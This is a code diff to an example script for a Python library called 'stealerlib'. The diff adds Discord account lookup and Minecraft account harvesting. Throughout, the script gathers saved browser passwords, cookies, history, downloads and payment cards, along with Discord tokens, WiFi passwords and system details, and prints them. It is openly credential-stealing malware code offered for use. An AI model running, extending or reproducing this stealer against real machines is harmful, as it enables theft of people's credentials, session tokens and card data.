@@ -7,8 +7,10 @@
 
 from stealerlib.wifi import WiFi
 from stealerlib.system import System
-from stealerlib.discord import Discord
 from stealerlib.browser import Browser
+
+from stealerlib.apps.discord import Discord
+from stealerlib.apps.minecraft import Minecraft
 
 conv = False # default on commands is True (browser.get_passwords())
              # if True, functions will return a list of values
@@ -32,43 +34,53 @@ if __name__ == '__main__':
     browser = Browser()
     network = WiFi()
     discord = Discord()
+    minecraft = Minecraft()
 
     passwords = browser.get_passwords(conv=conv)
-    print(passwords, '\n') # conv=True ->  [(url, username, password), ...]
-                           # conv=False -> [BrowserTypes.Login, ...]
-
+    print('Browser Passwords:', passwords, '\n') # conv=True ->  [(url, username, password), ...]
+                                                # conv=False -> [BrowserTypes.Login, ...]
 
     cookies = browser.get_cookies(conv=conv)
-    print(cookies, '\n') # conv=True ->  [(host, expires?, expire_date, path, name, value), ...]
-                         # conv=False -> [BrowserTypes.Cookie, ...]
-
+    print('Browser Cookies:', cookies, '\n') # conv=True ->  [(host, expires?, expire_date, path, name, value), ...]
+                                             # conv=False -> [BrowserTypes.Cookie, ...]
 
     history = browser.get_history(conv=conv)
-    print(history, '\n') # conv=True ->  [(site_url, title, timestamp), ...]
-                         # conv=False -> [BrowserTypes.Site, ...]
+    print('Browser History:', history, '\n') # conv=True ->  [(site_url, title, timestamp), ...]
+                                             # conv=False -> [BrowserTypes.Site, ...]
 
     downloads = browser.get_downloads(conv=conv)
-    print(downloads, '\n') # conv=True ->  [(tab_url, local_path), ...]
-                           # conv=False -> [BrowserTypes.Download, ...]
+    print('Browser Downloads:', downloads, '\n') # conv=True ->  [(tab_url, local_path), ...]
+                                                 # conv=False -> [BrowserTypes.Download, ...]
 
     cards = browser.get_cards(conv=conv)
-    print(cards, '\n') # conv=True ->  [(name, month, year, number, date_modified), ...]
-                       # conv=False -> [BrowserTypes.Card, ...]
+    print('Browser Cards:', cards, '\n') # conv=True ->  [(name, month, year, number, date_modified), ...]
+                                         # conv=False -> [BrowserTypes.Card, ...]
 
-    discord.get_tokens()
-    print(discord.tokens, '\n') # conv=True ->  [token1, token2, ...]
-                                # conv=False -> [AppTypes.Token, ...]
+    discord.get_tokens(conv=conv)
+    print('Discord Tokens:', discord.tokens, '\n') # conv=True ->  [token1, token2, ...]
+                                                   # conv=False -> [DiscordTypes.Token, ...]
 
+    discord.get_token_information(discord.tokens, conv=conv)
+    print('Discord Accounts:', discord.accounts, '\n') # conv=True ->  [(id, token, username, discriminator, email, phone), ...]
+                                                       # conv=False -> [DiscordTypes.Token, ...]
 
-    network.get_wifi_passwords()
-    print(network.credentials, '\n') # conv=True ->  [(ssid, password), ...]
-                                     # conv=False -> [NetTypes.WiFi, ...]
-
+    network.get_wifi_passwords(conv=conv)
+    print('WiFi Credentials:', network.credentials, '\n') # conv=True ->  [(ssid, password), ...]
+                                                          # conv=False -> [WiFiTypes.SSID, ...]
 
     system.get_processes(conv=conv)
-    print(system.processes, '\n') # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
-                                  # conv=False -> [SystemTypes.Process, ...]
+    print('System Processes:', system.processes, '\n') # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
+                                                       # conv=False -> [SystemTypes.Process, ...]
 
     system.get_partitions(conv=conv)
-    print(system.partitions, '\n')  # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
-                                    # conv=False -> [SystemTypes.Partition, ...]
+    print('System Partitions:', system.partitions, '\n') # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
+                                                         # conv=False -> [SystemTypes.Partition, ...]
+    
+    print(system.comp_info,
+          system.os_info,
+          system.proc_info,
+          system.gpu_info)
+
+    minecraft.get_accounts(conv=conv)
+    print('Minecraft Accounts:', minecraft.accounts, '\n') # conv=True ->  [(email, username, uuid, token), ...]
+                                                           # conv=False -> [MinecraftTypes.Account, ...]
